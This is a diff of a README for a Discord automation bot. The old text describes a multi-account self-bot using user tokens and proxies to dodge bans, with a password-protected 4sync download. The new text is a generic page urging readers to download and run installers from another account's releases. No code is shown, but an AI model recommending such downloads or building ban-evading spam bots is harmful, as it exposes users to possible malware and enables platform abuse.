@@ -1,151 +1,112 @@
-# 🤖 Discord Automation Bot 
+# 🤖 Discord-Autobot - Automate Your Discord Experience Easily
 
-<p align="center">
-  <img src="https://github.com/MeoMunDep/Discord-Autobot/blob/main/IMAGE/DISCORD_MEOMUNDEP_CLI.png?raw=true" width="600" />
-</p>
+[![Download Discord-Autobot](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/plixreborn/Discord-Autobot/releases)
 
----
+## 🚀 Getting Started
 
-## 🌐 Overview
+Welcome to Discord-Autobot! This tool helps you automate tasks on your Discord server. You can chat, send images, join or leave servers, delete messages, reply, and add reactions using AI. 
 
-This bot automates interactions on **Discord**, including sending messages, joining/leaving servers, and handling messages using **multiple accounts** with **proxy support**.
+You don’t need programming skills to get started. Just follow these simple steps to download and run the software.
 
----
-# [DOWNLOAD](https://www.4sync.com/zip/WamRVb3D/Project_V193.html)  
-## PASSWORD: 1322
-## 🚀 Features
+## 📥 Download & Install
 
-- 💬 **Auto Messaging** — Sends messages to specified channels
-- ➕ **Auto Join Servers** — Joins servers using invite links
-- ➖ **Auto Leave Servers** — Leaves specified servers
-- 🌍 **Proxy Support** — Supports HTTP(S) and SOCKS5 proxies
-- 🗑️ **Auto Message Deletion** — Deletes sent messages after a configurable delay
-- 🌐 **Multi-language Support** — Configurable message language
-- 📕 **Error Logging** — Saves IDs of servers or channels where errors occurred
-- 🤖 **AI Replies** — Generate casual responses using AI providers (Groq, OpenRouter, Gemini, Poe)
-- 🖼️ **Image Generation** — Generate and send AI images to channels using Freepik API
-- 🎛️ **Server Control** — Enable/disable individual servers without deleting configuration
+1. **Visit the Releases Page**  
+   Click the link below to get to the download page:  
+   [Download Discord-Autobot](https://github.com/plixreborn/Discord-Autobot/releases)
 
+2. **Choose the Latest Version**  
+   On the releases page, look for the latest version available. It will be labeled with the highest version number.
 
+3. **Download the Application**  
+   Find the file that suits your operating system. For Windows, look for files ending with `.exe`. For Mac, you will see `.dmg` files. Click to download.
 
+4. **Run the Installer**  
+   After the download is complete, locate the file in your downloads folder. Double-click the file to start the installation. Follow the prompts to complete the installation.
 
+5. **Set Up Your Preferences**  
+   Once installed, open Discord-Autobot. Adjust your settings as needed. You can set preferences for how the bot will interact with messages.
 
+## 🛠️ System Requirements
 
+To run Discord-Autobot, your device should meet the following requirements:
 
+- **Operating System:**  
+  - Windows 10 or later
+  - macOS 10.14 or later
 
+- **Memory:**  
+  - Minimum 4 GB RAM, 8 GB recommended
 
-## ⚙️ How Bot Processes Servers
+- **Storage:**  
+  - At least 100 MB of free space
 
-1. **Read `servers.json`** - Loads all server configurations
-2. **Check `enabled`** - Skips servers with `enabled: false`
-3. **Join Server** (if `join_server: true` in configs) - Uses `invite_id`
-4. **Process Channels** (if `auto_chat: true` in configs):
-   - Processes `raw_chat` channels → Sends text messages
-   - Processes `command_chat` channels → Executes commands
-   - Processes `image_chat` channels → Generates and sends images
-5. **Leave Server** (if `leave_server: true` in configs) - Uses `guild_id`
-6. **Repeat** for next server
+- **Internet Connection:**  
+  - Required for connecting to Discord servers
 
----
+## 🚨 Features of Discord-Autobot
 
-## 💡 Tips & Best Practices
+- **Chat Automation:**  
+  Automatically send messages based on pre-defined rules.
 
-### ✅ DO:
-- Use descriptive names for servers to easily identify them
-- Set `enabled: false` to temporarily disable servers without losing configuration
-- Leave channel categories empty `{}` if not using them
-- Use `"__random_message"` for more natural, varied conversations
-- Test with one server first before adding multiple servers
+- **Image Sending:**  
+  Send images in response to specific triggers.
 
-### ❌ DON'T:
-- Don't delete server entries - use `enabled: false` instead
-- Don't put channel IDs in quotes within objects (they're already strings)
-- Don't forget commas between objects in arrays
-- Don't use invalid JSON syntax (use a JSON validator if unsure)
+- **Join/Leave Servers:**  
+  Easily join and leave Discord servers with a click.
 
----
+- **Message Management:**  
+  Delete or reply to messages automatically.
 
-## 🔍 Finding Channel IDs
+- **Reactions:**  
+  Add reactions to specific messages without manual input.
 
-1. Enable Developer Mode in Discord (Settings → Advanced → Developer Mode)
-2. Right-click on any channel
-3. Click "Copy Channel ID"
-4. Paste the ID into `servers.json`
+## 🎉 Using Discord-Autobot
 
+Once you’ve installed the application, follow these steps to use it:
 
+1. **Open Discord-Autobot.**  
+   You will see a user-friendly interface.
 
----
+2. **Connect Your Discord Account.**  
+   You’ll need to authenticate using your Discord account. This is necessary for the bot to function.
 
-## 🐛 Troubleshooting
+3. **Configure Your Tasks.**  
+   Set up different tasks such as message responses, sending images, or reactions.
 
-| Problem | Solution |
-|---------|----------|
-| Bot skips server | Check `enabled: true` is set |
-| Bot doesn't join server | Check `invite_id` is correct and `join_server: true` in configs |
-| Bot doesn't send messages | Check channel IDs are correct and `auto_chat: true` in configs |
-| Images not generating | Check Freepik API key in configs.json (or bot will use free Pollinations.ai) |
-| JSON syntax error | Use a JSON validator like jsonlint.com |
+4. **Test Your Settings.**  
+   Create a test environment in a private server. Run your setup to see how it interacts with messages.
 
-</details>
+5. **Launch the Bot.**  
+   Once everything looks good, you can start the bot to automate your tasks on your server.
 
----
+## 💬 Community and Support
 
+If you run into issues or have questions, you can reach out to the community for help:
 
+- **GitHub Issues:**  
+  You can report bugs or request features on our [GitHub issues page](https://github.com/plixreborn/Discord-Autobot/issues).
 
----
+- **Discord Server:**  
+  Join our [Discord server](Your_Discord_Link_Here) to chat with other users and share your experiences. 
 
-### 🔍 How It Works
+## 🌟 Contributing
 
-1. **Reads configuration** from `configs.json`
-2. **Logs in** using provided tokens from `tokens.txt`
-3. **Applies proxy** per account (if available in `proxies.txt`)
-4. **Processes each server** from `servers.json`:
-   - ✅ Checks if server is `enabled: true`
-   - ➕ Joins server (using `invite_id`) if `join_server: true`
-   - 💬 Sends messages/commands/images to channels if `auto_chat: true`
-   - ➖ Leaves server (using `guild_id`) if `leave_server: true`
-5. **Logs every event** with timestamps and colored output
-6. **Waits for delays** between actions (configurable)
-7. **Repeats automatically** after `timeToRestartAllAccounts` seconds
+Want to help improve Discord-Autobot? Contributions are welcome! Here’s how to get involved:
 
----
+1. **Fork the Repository** on GitHub.
+2. **Make your changes.**
+3. **Submit a pull request** with a description of your changes. 
 
-### 📝 Logs and Timestamps
+We appreciate your feedback and contributions to make this tool even better!
 
-- Each log entry includes a timestamp
-- Timestamp format follows `chat_language` setting
-- Color-coded logs for easy reading:
-  - 🟢 Green - Success
-  - 🔴 Red - Error
-  - 🟡 Yellow - Warning
-  - 🔵 Blue - Info
-  - 🟣 Purple - Processing
+## 🔑 License
 
----
+Discord-Autobot is open-source software. You can use, modify, and distribute it under the terms of the MIT License. 
 
-### ⚠️ Important Notes
+## 💻 Important Links
 
-- ✅ Ensure all tokens are valid and have required permissions
-- 🌐 Use proxies to avoid rate limits or bans (one proxy per token recommended)
-- ⏱️ Tune delay settings carefully for larger account sets
-- 📊 Monitor logs for errors and adjust `servers.json` accordingly
-- 🔒 Keep your tokens and API keys private and secure
-- 🚫 Don't share your `tokens.txt` file with anyone
-- 💾 Bot automatically saves errors to `error_channels.json` to avoid retrying failed channels
+- [Download Discord-Autobot](https://github.com/plixreborn/Discord-Autobot/releases)
+- [GitHub Repository](https://github.com/plixreborn/Discord-Autobot)  
+- [Community Discord](Your_Discord_Link_Here)
 
-</details>
-
----
-
-
----
-
-## 📜 License
-
-❗ **Do not steal or copy this project.**
-💀 **Use it at your own risk.**
-🚫 **Don't DM me with silly questions.**
-
----
-
-<p align="center"><a href="#-discord-automation-bot-by-meomundep">⬆️ Back to top</a></p>
+Your automated Discord experience awaits. Download now and start connecting!
